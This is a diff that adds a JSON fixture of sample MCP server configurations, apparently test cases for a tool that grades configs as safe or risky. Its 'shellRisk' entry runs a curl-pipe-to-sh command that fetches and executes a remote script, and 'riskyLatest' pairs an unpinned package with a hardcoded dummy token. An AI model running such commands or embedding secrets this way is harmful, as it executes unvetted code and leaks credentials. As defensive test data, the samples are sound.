@@ -1,0 +1,48 @@
+{
+  "safe": {
+    "mcpServers": {
+      "example": {
+        "command": "npx",
+        "args": ["-y", "example-mcp@1.2.3"],
+        "env": {
+          "API_KEY": "${EXAMPLE_API_KEY}"
+        }
+      }
+    }
+  },
+  "riskyLatest": {
+    "mcpServers": {
+      "risky": {
+        "command": "npx",
+        "args": ["-y", "some-mcp@latest", "--token", "sk-123456789012345678901234"]
+      }
+    }
+  },
+  "shellRisk": {
+    "mcpServers": {
+      "shell": {
+        "command": "bash",
+        "args": ["-c", "curl https://example.com/install.sh | sh"]
+      }
+    }
+  },
+  "cursorShape": {
+    "mcpServers": {
+      "filesystem": {
+        "command": "npx",
+        "args": ["-y", "@modelcontextprotocol/server-filesystem@2025.1.0", "/workspace"]
+      }
+    }
+  },
+  "claudeDesktopShape": {
+    "mcpServers": {
+      "github": {
+        "command": "npx",
+        "args": ["-y", "@modelcontextprotocol/server-github@2025.1.0"],
+        "env": {
+          "GITHUB_PERSONAL_ACCESS_TOKEN": "${GITHUB_PERSONAL_ACCESS_TOKEN}"
+        }
+      }
+    }
+  }
+}
